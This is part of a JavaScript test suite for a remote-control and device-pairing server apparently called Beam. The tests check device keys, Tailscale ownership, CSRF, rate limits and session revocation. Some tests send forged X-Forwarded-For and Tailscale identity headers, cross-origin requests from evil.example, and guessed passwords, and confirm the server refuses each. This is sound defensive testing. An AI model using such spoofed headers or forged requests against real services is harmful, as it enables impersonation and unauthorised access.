    assert.deepEqual([r.status, r.json.reason], [403, 'sign-in'], 'a browser signed in by Tailscale identity');
    const lapApp = { Authorization: `Bearer ${appSignIn.json.key}`, 'X-Beam-Device-Id': 'rclaptop001', 'X-Beam-Platform': 'windows', 'X-Beam-Profile': RC_PROFILE.laptop, 'X-Beam-App-Version': '1.6.0', 'X-Beam-Device-Key': deviceKey(), ...from(RC_NET.laptop.ip4) };
    r = await startWith({ Cookie: `beam_key=${appSignIn.json.key}`, 'X-Beam-Device-Id': 'rclaptop001', 'X-Beam-Platform': 'windows', ...sameOrigin, ...from(RC_NET.laptop.ip4) });
    assert.deepEqual([r.status, r.json.reason], [403, 'sign-in'], "the app's token in a page, before the app itself has used it");
    r = await startWith(lapApp);
    assert.equal(r.status, 201, `the app's own requests: ${r.body}`);
    await sleep(600);
    const saved = JSON.parse(fs.readFileSync(file, 'utf8'));
    const tok = Object.values(saved.tokens).find(x => x.device === 'rclaptop001' && x.via === 'tailscale');
    assert.equal(tok?.platform, 'windows', 'remembered');
    assert.match(tok?.keyHash || '', /^[a-f0-9]{64}$/, 'key-bound on its first 1.6 request');
    assert.match(t.s.out, /Robin Laptop's Beam app proves itself with its device key from now on/);
    pcEv.close();
  } finally { await t.stop(); }
});

test('1.6 Remote control signals: the viewer waits for the PC; candidates are short and few; at most 512 KB a session', async () => {
  const t = await rcSetup('rc-flood');
  try {
    const { s, pc, laptop, status, rc, start } = t;
    await status(pc, { remoteControl: true });
    const pcEv = await openEvents(s.port, pc, '/api/events?mode=background');
    const lapEv = await openEvents(s.port, laptop, '/api/events?mode=background');
    for (const e of [pcEv, lapEv]) await e.wait('hello');
    const id = (await start(laptop)).json.id;
    const sig = (h, body) => rc('POST', `sessions/${id}/signal`, h, body);
    let r = await sig(laptop, { kind: 'candidates', candidates: [{ candidate: 'candidate:1 1 udp 1 100.64.91.2 5000 typ host' }] });
    assert.deepEqual([r.status, r.json.reason], [409, 'waiting'], 'nothing from the viewer before the PC accepts');
    assert.equal((await sig(laptop, { kind: 'restart' })).status, 409);
    assert.equal((await rc('POST', `sessions/${id}/lease`, pc)).status, 200);
    assert.equal((await sig(laptop, { kind: 'candidates', candidates: Array.from({ length: 20 }, (_, i) => ({ candidate: `candidate:${i} ${'c'.repeat(240)}`, sdpMid: '0', sdpMLineIndex: 0 })) })).status, 204);
    let sent = 0;
    while ((r = await sig(pc, { kind: 'offer', sdp: `v=0 ${'s'.repeat(60 * 1024)}` })).status === 204) sent++;
    assert.deepEqual([sent, r.status, r.json.reason], [8, 429, 'signals'], 'about 512 KB a session');
    await waitFor(() => lapEv.events.filter(e => e.event === 'rc-signal' && e.data.kind === 'offer').length === 8, 2000);
    assert.ok(!lapEv.closed && !pcEv.closed, 'both streams kept up');
    pcEv.close();
    lapEv.close();
  } finally { await t.stop(); }
});

test('1.6 Remote control: rc-sessions skips session-only sign-ins; a viewer removed while whois answers gets no session', async () => {
  const t = await rcSetup('rc-recheck');
  try {
    const { s, K, pc, laptop, phone, status, start } = t;
    await status(pc, { remoteControl: true });
    const pcEv = await openEvents(s.port, pc, '/api/events?mode=background');
    const watch = await openEvents(s.port, t.other);
    await post(s, '/api/password', { password: 'rc session pass 2' }, laptop);
    const login = await post(s, '/api/login', { secret: 'rc session pass 2', remember: false }, { ...sameOrigin, Cookie: 'beam_device_id=rcborrow002' });
    const borrowed = cookie(cookieValue(login), 'rcborrow002', { ...sameOrigin, 'X-Beam-Platform': 'web', ...from('100.64.91.81') });
    const tempEv = await openEvents(s.port, borrowed);
    for (const e of [pcEv, watch, tempEv]) await e.wait('hello');
    const id = (await start(laptop)).json.id;
    await watch.wait('rc-sessions', d => d.sessions.some(x => x.id === id), 1500);
    await sleep(300);
    assert.ok(!tempEv.events.some(e => e.event === 'rc-sessions'), 'not to a session-only sign-in');
    await t.rc('POST', `sessions/${id}/end`, laptop);
    // A new viewer whose whois takes a while is removed meanwhile: 401, and the PC hears nothing.
    const fresh = app(K, 'rcfresh0001', 'New Laptop', 'windows', { ...from(RC_NET.fresh.ip4), 'X-Beam-App-Version': '1.6.0', 'X-Beam-Profile': 'f8f8f8f8f8f8f8f8' });
    await s.req('GET', '/api/me', { headers: fresh });
    t.ts.delay = 800;
    const pending = start(fresh);
    await sleep(300);
    assert.equal((await s.req('DELETE', '/api/devices/rcfresh0001', { headers: phone })).status, 204);
    const r = await pending;
    t.ts.delay = 0;
    assert.equal(r.status, 401, r.body);
    await sleep(200);
    assert.ok(!pcEv.events.some(e => e.event === 'rc-request' && e.data.from === 'rcfresh0001'));
    assert.deepEqual((await t.rc('GET', 'sessions', phone)).json.sessions, []);
    for (const e of [pcEv, watch, tempEv]) e.close();
  } finally { await t.stop(); }
});

test('1.6 Remote control with Tailscale owners: a viewer or PC on another account\'s machine is refused', async () => {
  const t = await rcSetup('rc-owner', { env: { BEAM_TAILSCALE_OWNERS: RC_USER } });
  try {
    const { s, K, pc, status } = t;
    await status(pc, { remoteControl: true });
    const pcEv = await openEvents(s.port, pc, '/api/events?mode=background');
    await pcEv.wait('hello');
    const mallory = app(K, 'rcmallory01', 'Mallory PC', 'windows', { ...from(RC_NET.mallory.ip4), 'X-Beam-App-Version': '1.6.0', 'X-Beam-Profile': 'f9f9f9f9f9f9f9f9' });
    await s.req('GET', '/api/me', { headers: mallory });
    let r = await t.start(mallory);
    assert.deepEqual([r.status, r.json.reason], [403, 'not-owner'], 'as a viewer');
    await status(mallory, { remoteControl: true });
    const malloryEv = await openEvents(s.port, mallory, '/api/events?mode=background');
    await malloryEv.wait('hello');
    r = await t.start(t.laptop, 'rcmallory01');
    assert.deepEqual([r.status, r.json.reason], [409, 'not-allowed'], 'as a PC: never tied to its app');
    assert.match(s.out, /Mallory PC turned on "Allow remote control" from the Tailscale account mallory@example\.com, which isn't one of this Beam's owners/);
    assert.equal((await t.start(t.laptop)).status, 201, "an owner's machines still may");
    pcEv.close();
    malloryEv.close();
  } finally { await t.stop(); }
});

test('1.6 Remote control: only the PC ends with "not-listed"; from anyone else it is "stopped"', async () => {
  const t = await rcSetup('rc-notlisted');
  try {
    const { s, pc, laptop, phone, status, rc, start } = t;
    await status(pc, { remoteControl: true });
    const pcEv = await openEvents(s.port, pc, '/api/events?mode=background');
    const lapEv = await openEvents(s.port, laptop, '/api/events?mode=background');
    for (const e of [pcEv, lapEv]) await e.wait('hello');
    for (const [who, h, reason] of [['the viewer', laptop, 'stopped'], ['a third device', phone, 'stopped'], ['the PC', pc, 'not-listed']]) {
      const id = (await start(laptop)).json.id;
      assert.equal((await rc('POST', `sessions/${id}/end`, h, { reason: 'not-listed' })).status, 204);
      assert.equal((await lapEv.wait('rc-end', d => d.id === id, 1000)).data.reason, reason, who);
    }
    assert.match(s.out, /Robin Laptop's request to control Desktop ended \(not-listed, by Desktop\)/);
    pcEv.close();
    lapEv.close();
  } finally { await t.stop(); }
});

test('1.6 Remote control ends on sign-out-others ("revoked"), a move and a shutdown ("server")', async () => {
  for (const [label, trigger, reason] of [
    ['sign-out-others', t => post(t.s, '/api/security/sign-out-others', {}, t.phone), 'revoked'],
    ['move', t => post(t.s, '/api/move', { to: 'http://127.0.0.1:8799', force: true }, { Authorization: `Bearer ${t.K}` }), 'server'],
    ['shutdown', t => t.s.req('POST', '/api/admin/shutdown', { headers: { Authorization: `Bearer ${t.K}` } }), 'server'],
  ]) {
    const t = await rcSetup(`rc-${label}`);
    try {
      await t.status(t.pc, { remoteControl: true });
      const pcEv = await openEvents(t.s.port, t.pc, '/api/events?mode=background');
      const lapEv = await openEvents(t.s.port, t.laptop, '/api/events?mode=background');
      for (const e of [pcEv, lapEv]) await e.wait('hello');
      const id = (await t.start(t.laptop)).json.id;
      const r = await trigger(t);
      assert.ok([200, 202].includes(r.status), `${label}: ${r.status} ${r.body}`);
      for (const e of [pcEv, lapEv]) assert.equal((await e.wait('rc-end', d => d.id === id, 2000)).data.reason, reason, label);
      pcEv.close();
      lapEv.close();
    } finally { await t.stop(); }
  }
});

test('1.6 Remote control addresses are the ones the server saw (through tailscale serve, plus whois), never what a client says', async () => {
  const t = await rcSetup('rc-attest');
  try {
    const { s, pc, phone, status, start } = t;
    await status(pc, { remoteControl: true, locked: false });
    const pcEv = await openEvents(s.port, pc, '/api/events?mode=background');
    await pcEv.wait('hello');
    // The phone claims other addresses in its body, in a forged X-Forwarded-For hop and a forged Tailscale header.
    const liar = { ...phone, 'X-Forwarded-For': `100.64.91.4, ${RC_NET.phone.ip6}`, 'Tailscale-User-Login': 'mallory@example.com' };
    let r = await s.req('POST', '/api/rc/sessions', { headers: json(liar), body: JSON.stringify({
      device: 'rcdesk00001', ip4: '100.64.66.6', ip6: 'fd7a:115c:a1e0::666', you: { ip4: '100.64.66.6' },
      viewer: { ip4: '100.64.66.6', node: 'evil', user: 'mallory@example.com' }, host: { ip4: '100.64.66.7' },
    }) });
    assert.equal(r.status, 201, r.body);
    assert.deepEqual(r.json.you, { ip4: RC_NET.phone.ip4, ip6: RC_NET.phone.ip6 }, 'the phone came in on its IPv6; whois adds its IPv4');
    assert.deepEqual([r.json.host.ip4, r.json.host.ip6], [RC_NET.pc.ip4, RC_NET.pc.ip6]);
    const asked = (await pcEv.wait('rc-request', d => d.id === r.json.id, 1000)).data;
    assert.deepEqual(asked.viewer, { ip: RC_NET.phone.ip6, ip4: RC_NET.phone.ip4, ip6: RC_NET.phone.ip6, node: 'pixel', user: RC_USER, platform: 'android' });
    await t.rc('POST', `sessions/${r.json.id}/end`, phone);
    // A PC on the server's own machine gets the server's own Tailscale addresses.
    const hostPc = app(t.K, 'rchostpc001', 'Server PC', 'windows', { 'X-Beam-App-Version': '1.6.0', 'X-Beam-Profile': 'fafafafafafafafa' });
    await t.status(hostPc, { remoteControl: true });
    const hostEv = await openEvents(s.port, hostPc, '/api/events?mode=background');
    await hostEv.wait('hello');
    r = await start(t.laptop, 'rchostpc001');
    assert.deepEqual([r.status, r.json.host.ip4, r.json.host.ip6], [201, '100.64.91.100', 'fd7a:115c:a1e0::5b64']);
    assert.equal((await hostEv.wait('rc-request', d => d.id === r.json.id, 1000)).data.viewer.node, 'robin-laptop');
    pcEv.close();
    hostEv.close();
  } finally { await t.stop(); }
});

test('1.6 Remote control from a browser needs same-origin proof (CSRF)', async () => {
  const t = await rcSetup('rc-csrf');
  try {
    const { s, laptop } = t;
    await post(s, '/api/password', { password: 'rc csrf pass' }, laptop);
    const login = await post(s, '/api/login', { secret: 'rc csrf pass', remember: true }, { ...sameOrigin, Cookie: 'beam_device_id=rcbrowse001' });
    assert.equal(login.status, 204);
    const browser = { Cookie: `beam_key=${cookieValue(login)}; beam_device_id=rcbrowse001`, 'Content-Type': 'application/json', ...from('100.64.91.78') };
    for (const route of ['sessions', 'disable', 'sessions/0123456789abcdef/end', 'sessions/0123456789abcdef/signal', 'sessions/0123456789abcdef/lease']) {
      const r = await s.req('POST', `/api/rc/${route}`, { headers: { ...browser, Origin: 'https://evil.example' }, body: '{"device":"rcdesk00001","kind":"restart"}' });
      assert.deepEqual([r.status, r.json?.reason], [403, 'csrf'], route);
    }
    const r = await s.req('POST', '/api/rc/sessions', { headers: { ...browser, ...sameOrigin }, body: '{"device":"rcdesk00001"}' });
    assert.deepEqual([r.status, r.json.reason], [409, 'not-allowed'], 'same-origin gets through (to the next check)');
  } finally { await t.stop(); }
});

test('1.6 Remote control leaves nothing on disk or in the log: no session, SDP, candidate or address it relayed', async () => {
  const t = await rcSetup('rc-private');
  const marks = ['ZQSDPOFFER5511', 'ZQSDPANSWER6622', 'ZQCAND7733', 'ZQUFRAG8844', '100.64.66.66'];
  try {
    const { s, pc, laptop, status, rc, start } = t;
    await status(pc, { remoteControl: true });
    const pcEv = await openEvents(s.port, pc, '/api/events?mode=background');
    const lapEv = await openEvents(s.port, laptop, '/api/events?mode=background');
    for (const e of [pcEv, lapEv]) await e.wait('hello');
    const id = (await start(laptop)).json.id;
    await rc('POST', `sessions/${id}/lease`, pc);
    await rc('POST', `sessions/${id}/signal`, pc, { kind: 'offer', sdp: `v=0 ${marks[0]}` });
    await rc('POST', `sessions/${id}/signal`, laptop, { kind: 'answer', sdp: `v=0 ${marks[1]}` });
    await rc('POST', `sessions/${id}/signal`, laptop, { kind: 'candidates', candidates: [{ candidate: `candidate:${marks[2]} 1 udp 1 ${marks[4]} 5000 typ host`, sdpMid: '0', sdpMLineIndex: 0, usernameFragment: marks[3] }] });
    await pcEv.wait('rc-signal', d => d.kind === 'candidates', 1000);
    await rc('POST', `sessions/${id}/signal`, laptop, { kind: 'offer', sdp: `v=0 ${marks[0]}` }); // refused (a viewer can't offer)
    await rc('POST', 'disable', laptop, { device: 'rcdesk00001' });
    await s.req('GET', '/api/metrics', { headers: laptop });
    await sleep(500);
    pcEv.close();
    lapEv.close();
    await s.req('POST', '/api/admin/shutdown', { headers: { Authorization: `Bearer ${t.K}` } });
    await s.exited;
    const files = [];
    const walk = dir => { for (const e of fs.readdirSync(dir, { withFileTypes: true })) (e.isDirectory() ? walk(path.join(dir, e.name)) : files.push(path.join(dir, e.name))); };
    walk(s.dir);
    assert.ok(files.some(f => /server\.log$/.test(f)) && files.some(f => /devices\.json$/.test(f)), 'the log and the state files were checked');
    for (const f of files) {
      const text = fs.readFileSync(f).toString('utf8');
      for (const m of [...marks, id]) assert.ok(!text.includes(m), `${m} found in ${path.relative(s.dir, f)}`);
    }
    for (const m of [...marks, id]) assert.ok(!s.out.includes(m), `${m} in the server's output`);
    assert.match(s.out, /Robin Laptop stopped controlling Desktop after \d+ s \(revoked, by Robin Laptop\)/, 'the log still says what happened');
  } finally { await t.stop(); }
});

test('1.6 Device keys: trusted on first use from the Windows app\'s own sign-in; then its requests must carry it (403 device-key)', async () => {
  const t = await rcSetup('dk-tofu');
  try {
    const { s, phone } = t;
    const KEY = deviceKey();
    const pair = (await s.req('GET', '/api/pair', { headers: phone })).json.key;
    const shop = { Authorization: `Bearer ${pair}`, 'X-Beam-Device-Id': 'dkshop00001', 'X-Beam-Device': 'Shop Desktop', 'X-Beam-Platform': 'windows', 'X-Beam-Profile': 'abababababababab', 'X-Beam-App-Version': '1.6.0', ...from(RC_NET.shop.ip4) };
    const withKey = (h, k = KEY) => ({ ...h, 'X-Beam-Device-Key': k });
    assert.equal((await s.req('GET', '/api/me', { headers: shop })).status, 200, 'no key yet: fine');
    assert.equal((await s.req('GET', '/api/me', { headers: withKey(shop) })).status, 200, 'the first key is trusted');
    for (const [label, h] of [['no key', shop], ['another key', withKey(shop, deviceKey())], ['a malformed key', withKey(shop, 'short')]]) {
      const r = await s.req('GET', '/api/me', { headers: h });
      assert.deepEqual([r.status, r.json.reason], [403, 'device-key'], label);
    }
    assert.equal((await s.req('GET', '/api/events', { headers: shop })).status, 403, 'the event stream too');
    const master = app(t.K, 'dkshop00001', 'Shop Desktop', 'windows', { 'X-Beam-Profile': 'abababababababab', ...from(RC_NET.shop.ip4) });
    assert.equal((await s.req('GET', '/api/me', { headers: master })).status, 403, 'even with the master key');
    assert.equal((await s.req('GET', '/api/me', { headers: withKey(master) })).status, 200);
    const ev = await openEvents(s.port, withKey(shop));
    await ev.wait('hello');
    ev.close();
    assert.match(s.out, /Shop Desktop's Beam app proves itself with its device key from now on/);
    await sleep(400);
    const file = fs.readFileSync(path.join(s.data, 'devices.json'), 'utf8');
    assert.equal(JSON.parse(file).dkshop00001.keyHash, crypto.createHash('sha256').update(KEY).digest('hex'), 'only its hash is kept');
    assert.ok(!file.includes(KEY) && !fs.readFileSync(path.join(s.data, 'tokens.json'), 'utf8').includes(KEY));
  } finally { await t.stop(); }
});

test('1.6 Device keys: a sign-in naming a keyed device without its key gets a device of its own; one by Tailscale can\'t set a key', async () => {
  const t = await rcSetup('dk-claim', { env: { BEAM_TAILSCALE_OWNERS: RC_USER } });
  try {
    const { s, K, phone } = t;
    const KEY = deviceKey();
    // Shop's app signs in by Tailscale identity (a new device) and shows its key.
    const own = await post(s, '/api/autopair', { client: 'app', name: 'Shop Desktop', platform: 'windows' }, viaServe(RC_NET.shop.ip4, RC_USER));
    const shopId = own.json.you;
    const shop = { Authorization: `Bearer ${own.json.key}`, 'X-Beam-Device-Id': shopId, 'X-Beam-Platform': 'windows', 'X-Beam-Profile': 'abababababababab', 'X-Beam-Device-Key': KEY, ...from(RC_NET.shop.ip4) };
    assert.equal((await s.req('GET', '/api/me', { headers: shop })).status, 200);
    // A program in the work account signs in by Tailscale identity as the app, naming Shop's id: a device of its own.
    const ts = (body, extra = {}) => post(s, '/api/autopair', { client: 'app', name: 'Shop Desktop', platform: 'windows', ...body }, { ...viaServe(RC_NET.shop.ip4, RC_USER), ...extra });
    let r = await ts({ deviceId: shopId });
    assert.equal(r.status, 200);
    assert.notEqual(r.json.you, shopId, 'Tailscale identity without the key');
    assert.equal((await ts({ deviceId: shopId }, { 'X-Beam-Device-Key': KEY })).json.you, shopId, 'the app itself (with its key) keeps its id');
    // A pairing link, the password and an approved request: the same.
    const pair = (await s.req('GET', '/api/pair', { headers: phone })).json.key;
    r = await s.req('GET', '/api/me', { headers: { Authorization: `Bearer ${pair}`, 'X-Beam-Device-Id': shopId, 'X-Beam-Platform': 'windows', ...from('100.64.91.21') } });
    assert.ok(r.status === 200 && r.json.you !== shopId, 'a pairing link');
    await post(s, '/api/password', { password: 'dk claim pass' }, phone);
    r = await post(s, '/api/login', { secret: 'dk claim pass', client: 'app', deviceId: shopId, platform: 'windows' }, from('100.64.91.22'));
    assert.ok(r.status === 200 && r.json.you !== shopId, 'the password');
    r = await post(s, '/api/login', { secret: 'dk claim pass', client: 'app', deviceId: shopId, platform: 'windows' }, { ...from(RC_NET.shop.ip4), 'X-Beam-Device-Key': KEY });
    assert.equal(r.json.you, shopId, 'the password, with the key');
    const lr = (await post(s, '/api/login-requests', { name: 'Shop Desktop', platform: 'windows', deviceId: shopId }, from('100.64.91.23'))).json;
    await post(s, '/api/login-requests/approve', { code: lr.code }, phone);
    const approved = (await s.req('GET', `/api/login-requests/${lr.id}`, { headers: { 'X-Beam-Login-Secret': lr.secret } })).json.key;
    r = await s.req('GET', '/api/me', { headers: { Authorization: `Bearer ${approved}`, 'X-Beam-Device-Id': shopId, 'X-Beam-Platform': 'windows', ...from('100.64.91.23') } });
    assert.ok(r.status === 200 && r.json.you !== shopId, 'an approved request');
    assert.match(s.out, /A sign-in \(automatic\) named the device id of Shop Desktop without its device key: it gets a device of its own/);
    // A device from before 1.6 (no key yet): a Tailscale sign-in that names it can't set its key; the app's own can.
    const old = app(K, 'dkold000001', 'Camera PC', 'windows', { ...from(RC_NET.fresh.ip4), 'X-Beam-Profile': 'bcbcbcbcbcbcbcbc' });
    await s.req('GET', '/api/me', { headers: old });
    const taken = await post(s, '/api/autopair', { client: 'app', deviceId: 'dkold000001', name: 'Camera PC', platform: 'windows' }, viaServe(RC_NET.fresh.ip4, RC_USER));
    assert.equal(taken.json.you, 'dkold000001');
    const PROGRAM = deviceKey();
    const program = { Authorization: `Bearer ${taken.json.key}`, 'X-Beam-Device-Id': 'dkold000001', 'X-Beam-Platform': 'windows', 'X-Beam-Profile': 'bcbcbcbcbcbcbcbc', 'X-Beam-Device-Key': PROGRAM, ...from(RC_NET.fresh.ip4) };
    assert.equal((await s.req('GET', '/api/me', { headers: program })).status, 200);
    const REAL = deviceKey();
    assert.equal((await s.req('GET', '/api/me', { headers: { ...old, 'X-Beam-Device-Key': REAL } })).status, 200, "the app's own sign-in sets it");
    assert.equal((await s.req('GET', '/api/me', { headers: program })).status, 403, 'and the other one is out');
  } finally { await t.stop(); }
});

test('1.6 Device keys: a reinstalled app (new id, new key) keeps its own key; the old install\'s sign-ins are not bound to it', async () => {
  const t = await rcSetup('dk-merge');
  try {
    const { s, phone, pc, status, rc } = t;
    const OLD = deviceKey();
    const NEW = deviceKey();
    const base = { 'X-Beam-Device': 'Shop Desktop', 'X-Beam-Platform': 'windows', 'X-Beam-Profile': 'adadadadadadadad', 'X-Beam-App-Version': '1.6.0', ...from(RC_NET.shop.ip4) };
    const pairOld = (await s.req('GET', '/api/pair', { headers: phone })).json.key;
    const oldApp = { ...base, Authorization: `Bearer ${pairOld}`, 'X-Beam-Device-Id': 'dkold000002', 'X-Beam-Device-Key': OLD };
    assert.equal((await s.req('GET', '/api/me', { headers: oldApp })).status, 200);
    const oldEv = await openEvents(s.port, oldApp);
    await oldEv.wait('hello');
    oldEv.close();
    await sleep(300);
    const pairNew = (await s.req('GET', '/api/pair', { headers: phone })).json.key;
    const newApp = { ...base, Authorization: `Bearer ${pairNew}`, 'X-Beam-Device-Id': 'dknew000002', 'X-Beam-Device-Key': NEW };
    assert.equal((await s.req('GET', '/api/me', { headers: newApp })).status, 200);
    assert.match(s.out, /Linked "Shop Desktop" to "Shop Desktop" \(reinstalled app\)/);
    const r = await s.req('GET', '/api/me', { headers: oldApp });
    assert.deepEqual([r.status, r.json.reason], [403, 'device-key'], "the old install's sign-in now names the new device, whose key it doesn't have");
    // Remote control: the new app's sign-in is key-bound; the old one (in a page, without the key) isn't.
    await status(pc, { remoteControl: true });
    const pcEv = await openEvents(s.port, pc, '/api/events?mode=background');
    await pcEv.wait('hello');
    const start = h => s.req('POST', '/api/rc/sessions', { headers: { 'Content-Type': 'application/json', ...h }, body: '{"device":"rcdesk00001"}' });
    const page = (tok, extra = {}) => ({ Cookie: `beam_key=${tok}`, 'X-Beam-Device-Id': 'dknew000002', 'X-Beam-Platform': 'windows', ...sameOrigin, ...from(RC_NET.shop.ip4), ...extra });
    let res = await start(page(pairOld));
    assert.deepEqual([res.status, res.json.reason], [403, 'device-key'], 'no key');
    res = await start(page(pairOld, { 'X-Beam-Device-Key': NEW }));
    assert.deepEqual([res.status, res.json.reason], [403, 'sign-in'], 'the new key, but an old sign-in never used with it');
    res = await start(page(pairNew, { 'X-Beam-Device-Key': NEW }));
    assert.equal(res.status, 201, `the new app's viewer window: ${res.body}`);
    await rc('POST', `sessions/${res.json.id}/end`, pc);
    pcEv.close();
  } finally { await t.stop(); }
});
test('1.6 Sign-ins with a device token or the master key don\'t count against the password limits', async () => {
  const s = await startServer('login-limit', 8791);
  try {
    const K = s.key;
    await post(s, '/api/password', { password: 'limit pass one' }, app(K, 'limitadmin1'));
    // An app's own token, as the Android viewer uses it to get its page's cookie: 40 times in a row.
    const token = (await post(s, '/api/login', { secret: K, client: 'app', deviceId: 'limitapp001', platform: 'android' }, from('100.64.92.1'))).json.key;
    assert.match(token, /^bt_/);
    for (let i = 0; i < 40; i++) {
      const r = await post(s, '/api/login', { secret: token }, { ...sameOrigin, Cookie: 'beam_device_id=limitapp001', ...from('100.64.92.1') });
      assert.equal(r.status, 204, `token sign-in ${i + 1}: ${r.status}`);
    }
    for (let i = 0; i < 5; i++) assert.equal((await post(s, '/api/login', { secret: K, client: 'app' }, from('100.64.92.1'))).status, 200, 'the master key');
    // The password limits are untouched: the password works, and wrong guesses from one address still lock it.
    assert.equal((await post(s, '/api/login', { secret: 'limit pass one' }, { ...sameOrigin, ...from('100.64.92.1') })).status, 204, 'the password');
    const guesses = [];
    for (let i = 0; i < 6; i++) guesses.push((await post(s, '/api/login', { secret: `wrong guess ${i}` }, { ...sameOrigin, ...from('100.64.92.2') })).status);
    assert.deepEqual(guesses, [403, 403, 403, 403, 403, 429], 'five wrong passwords, then the address waits');
    assert.equal((await post(s, '/api/login', { secret: token }, { ...sameOrigin, Cookie: 'beam_device_id=limitapp001', ...from('100.64.92.2') })).status, 204,
      "a valid token isn't held up by that address's wrong passwords");
  } finally { await s.stop(); }
});

test('1.6 Remote control: signing out one sign-in ends only the sessions it takes part in', async () => {
  const t = await rcSetup('rc-revoke-one');
  try {
    const { s, laptop, phone, rc } = t;
    // The PC is a Beam app for Windows with its own (key-bound) sign-in.
    const KEY = deviceKey();
    const pcPair = (await s.req('GET', '/api/pair', { headers: laptop })).json.key;
    const pcApp = { Authorization: `Bearer ${pcPair}`, 'X-Beam-Device-Id': 'rvdesk00001', 'X-Beam-Device': 'Den PC', 'X-Beam-Platform': 'windows', 'X-Beam-Profile': 'aeaeaeaeaeaeaeae', 'X-Beam-App-Version': '1.6.0', 'X-Beam-Device-Key': KEY, ...from(RC_NET.shop.ip4) };
    assert.equal((await t.status(pcApp, { remoteControl: true })).status, 204);
    const pcEv = await openEvents(s.port, pcApp, '/api/events?mode=background');
    await pcEv.wait('hello');
    // The phone has two sign-ins: its app's own (A, a pairing link), and its viewer page's (B, made from A).
    const tokenA = (await s.req('GET', '/api/pair', { headers: laptop })).json.key;
    const phoneApp = { ...phone, Authorization: `Bearer ${tokenA}` };
    assert.equal((await s.req('GET', '/api/me', { headers: phoneApp })).status, 200);
    const pageLogin = await post(s, '/api/login', { secret: tokenA }, { ...sameOrigin, Cookie: 'beam_device_id=rcphone0001' });
    const page = { Cookie: `beam_key=${cookieValue(pageLogin)}; beam_device_id=rcphone0001`, 'X-Beam-Platform': 'android', ...sameOrigin, ...from(RC_NET.phone.ip6) };
    const startWith = h => s.req('POST', '/api/rc/sessions', { headers: { 'Content-Type': 'application/json', ...h }, body: '{"device":"rvdesk00001"}' });
    let r = await startWith(page);
    assert.equal(r.status, 201, r.body);
    let id = r.json.id;
    assert.equal((await rc('POST', `sessions/${id}/lease`, pcApp)).status, 200);
    const stillOn = async () => (await rc('GET', 'sessions', laptop)).json.sessions.some(x => x.id === id);
    // Signing out A (not the session's sign-in) leaves the session on; signing out B ends it.
    assert.equal((await s.req('POST', '/api/logout', { headers: phoneApp })).status, 204);
    await sleep(200);
    assert.ok(await stillOn(), 'signing out another sign-in of the phone leaves it on');
    assert.ok(!pcEv.events.some(e => e.event === 'rc-end'));
    assert.equal((await s.req('POST', '/api/logout', { headers: page })).status, 204);
    assert.equal((await pcEv.wait('rc-end', d => d.id === id, 1000)).data.reason, 'revoked');
    assert.ok(!(await stillOn()));
    // The PC's side: another sign-in of the PC (its web view's) leaves it on; the one its app acts with ends it.
    r = await t.start(laptop, 'rvdesk00001');
    assert.equal(r.status, 201, r.body);
    id = r.json.id;
    assert.equal((await rc('POST', `sessions/${id}/lease`, pcApp)).status, 200);
    const viewLogin = await post(s, '/api/login', { secret: pcPair }, { ...sameOrigin, Cookie: 'beam_device_id=rvdesk00001', 'X-Beam-Device-Key': KEY });
    assert.equal((await s.req('POST', '/api/logout', { headers: { Cookie: `beam_key=${cookieValue(viewLogin)}`, ...sameOrigin } })).status, 204);
    await sleep(200);
    assert.ok(await stillOn(), "signing out the PC's web view leaves it on");
    assert.equal((await s.req('POST', '/api/logout', { headers: pcApp })).status, 204);
    assert.ok(!(await stillOn()), "signing out the PC app's own sign-in ends it");
    pcEv.close();
  } finally { await t.stop(); }
});

// ---------------------------------------------------------------- runner

(async () => {
  const filters = process.argv.slice(2).map(s => s.toLowerCase());
  const chosen = tests.filter(t => !filters.length || filters.some(f => t.name.toLowerCase().includes(f)));
  let failed = 0;
  const started = Date.now();
  for (const t of chosen) {
    const t0 = Date.now();
    try {
      await t.fn();
      console.log(`ok    ${t.name} (${Date.now() - t0} ms)`);
    } catch (err) {
      failed++;
      console.log(`FAIL  ${t.name}\n      ${String(err.stack || err).split('\n').slice(0, 6).join('\n      ')}`);
    }
    for (const c of children) try { c.kill(); } catch {}
  }
  console.log(`\n${chosen.length - failed} passed, ${failed} failed (${Math.round((Date.now() - started) / 1000)} s)`);
  fs.rmSync(TMP, { recursive: true, force: true });
  process.exit(failed ? 1 : 0);
})();
